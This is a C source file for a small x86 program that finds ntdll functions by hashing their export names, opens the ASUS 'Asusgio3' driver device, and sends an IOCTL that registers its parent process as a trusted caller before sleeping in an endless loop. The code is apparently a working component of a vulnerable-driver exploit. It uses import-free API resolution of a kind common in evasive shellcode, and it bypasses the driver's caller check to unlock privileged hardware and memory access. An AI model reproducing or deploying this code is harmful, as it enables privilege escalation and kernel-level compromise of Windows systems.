#ifdef _WIN64
#error Compile shell as x86 only
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include <intrin.h>
#include "ntos.h"

#define Hash_NtCreateFile               0x71e2bc4a
#define Hash_NtDeviceIoControlFile      0xc24c2e8e
#define Hash_RtlInitUnicodeString       0xcd51673e
#define Hash_NtQueryInformationProcess  0x47ccd80a
#define Hash_NtDelayExecution           0x547718e5

#define FILE_DEVICE_ASUSIO          (DWORD)0x0000A040

#define ASUSIO3_REGISTER_FUNCID     (DWORD)0x924

#define IOCTL_ASUSIO_REGISTER_TRUSTED_CALLER     \
    CTL_CODE(FILE_DEVICE_ASUSIO, ASUSIO3_REGISTER_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0xA040A490

typedef NTSTATUS(NTAPI* pfnNtCreateFile)(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength);

typedef NTSTATUS(NTAPI* pfnNtDeviceIoControlFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

typedef VOID(NTAPI *pfnRtlInitUnicodeString)(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength);

typedef NTSTATUS (NTAPI *pfnNtDelayExecution)(
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER DelayInterval);

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash);
DWORD NTAPI ComputeHash(char* s);

VOID NTAPI main()
{
    NTSTATUS ntStatus;
    DWORD dummyValue, parentPID;
    PPEB Peb = NtCurrentPeb();
    HANDLE deviceHandle = NULL;

    pfnNtDeviceIoControlFile pNtDeviceIoControlFile;
    pfnNtCreateFile pNtCreateFile;
    pfnRtlInitUnicodeString pRtlInitUnicodeString;
    pfnNtQueryInformationProcess pNtQueryInformationProcess;
    pfnNtDelayExecution pNtDelayExecution;

    PLDR_DATA_TABLE_ENTRY firstEntry =
        (PLDR_DATA_TABLE_ENTRY)Peb->Ldr->InLoadOrderModuleList.Flink;

    PLDR_DATA_TABLE_ENTRY ntdllEntry =
        (PLDR_DATA_TABLE_ENTRY)firstEntry->InLoadOrderLinks.Flink;

    PVOID pvNtdll = ntdllEntry->DllBase;

    UNICODE_STRING deviceName;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    PROCESS_BASIC_INFORMATION pbi;

    LARGE_INTEGER liTimeOut;

    WCHAR szDeviceName[] = { L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', 
        L'A', L's', L'u', L's', L'g', L'i', L'o', L'3', 0 };

    pNtDeviceIoControlFile = (pfnNtDeviceIoControlFile)RawGetProcAddress(pvNtdll, Hash_NtDeviceIoControlFile);
    pNtCreateFile = (pfnNtCreateFile)RawGetProcAddress(pvNtdll, Hash_NtCreateFile);
    pRtlInitUnicodeString = (pfnRtlInitUnicodeString)RawGetProcAddress(pvNtdll, Hash_RtlInitUnicodeString);
    pNtQueryInformationProcess = (pfnNtQueryInformationProcess)RawGetProcAddress(pvNtdll, Hash_NtQueryInformationProcess);
    pNtDelayExecution = (pfnNtDelayExecution)RawGetProcAddress(pvNtdll, Hash_NtDelayExecution);

    if (pNtDeviceIoControlFile &&
        pNtCreateFile &&
        pRtlInitUnicodeString &&
        pNtQueryInformationProcess &&
        pNtDelayExecution)
    {
        __stosb((PUCHAR)&pbi, 0, sizeof(pbi));

        ntStatus = pNtQueryInformationProcess(NtCurrentProcess(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &dummyValue);

        if (NT_SUCCESS(ntStatus)) {

            parentPID = PtrToUlong(pbi.InheritedFromUniqueProcessId);

            pRtlInitUnicodeString(&deviceName, szDeviceName);
            InitializeObjectAttributes(&objectAttributes, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

            ntStatus = pNtCreateFile(&deviceHandle,
                GENERIC_READ | GENERIC_WRITE,
                &objectAttributes,
                &ioStatusBlock,
                NULL,
                0,
                0,
                FILE_OPEN,
                0,
                NULL,
                0);

            if (NT_SUCCESS(ntStatus)) {

                dummyValue = 0;

                ntStatus = pNtDeviceIoControlFile(deviceHandle,
                    NULL,
                    NULL,
                    NULL,
                    &ioStatusBlock,
                    IOCTL_ASUSIO_REGISTER_TRUSTED_CALLER,
                    &parentPID,
                    sizeof(parentPID),
                    &dummyValue,
                    sizeof(dummyValue));

                if (NT_SUCCESS(ntStatus)) {

                    liTimeOut.QuadPart = UInt32x32To64(3000, 10000);
                    liTimeOut.QuadPart *= -1;

                    while (TRUE) {

                        pNtDelayExecution(0, (PLARGE_INTEGER)&liTimeOut);

                    }

                }

            }

        }

        liTimeOut.QuadPart = UInt32x32To64(3000, 10000);
        liTimeOut.QuadPart *= -1;

        while (TRUE) {

            pNtDelayExecution(0, (PLARGE_INTEGER)&liTimeOut);

        }

    }
    else {
        __debugbreak();
    }

}

DWORD NTAPI ComputeHash(char* s)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash)
{
    PIMAGE_DOS_HEADER           dosh = (PIMAGE_DOS_HEADER)Module;
    PIMAGE_FILE_HEADER          fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
    PIMAGE_OPTIONAL_HEADER      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
    DWORD                       ETableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY     pexp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosh + ETableVA);
    PDWORD                      names = (PDWORD)((PBYTE)dosh + pexp->AddressOfNames), functions = (PDWORD)((PBYTE)dosh + pexp->AddressOfFunctions);
    PWORD                       ordinals = (PWORD)((PBYTE)dosh + pexp->AddressOfNameOrdinals);
    DWORD_PTR                   c, fp;
    PVOID                       fnptr = NULL;

    for (c = 0; c < pexp->NumberOfNames; c++) {
        if (ComputeHash((char*)((PBYTE)dosh + names[c])) == FuncHash) {
            fp = functions[ordinals[c]];
            fnptr = (PBYTE)Module + fp;
            break;
        }
    }

    return fnptr;
}
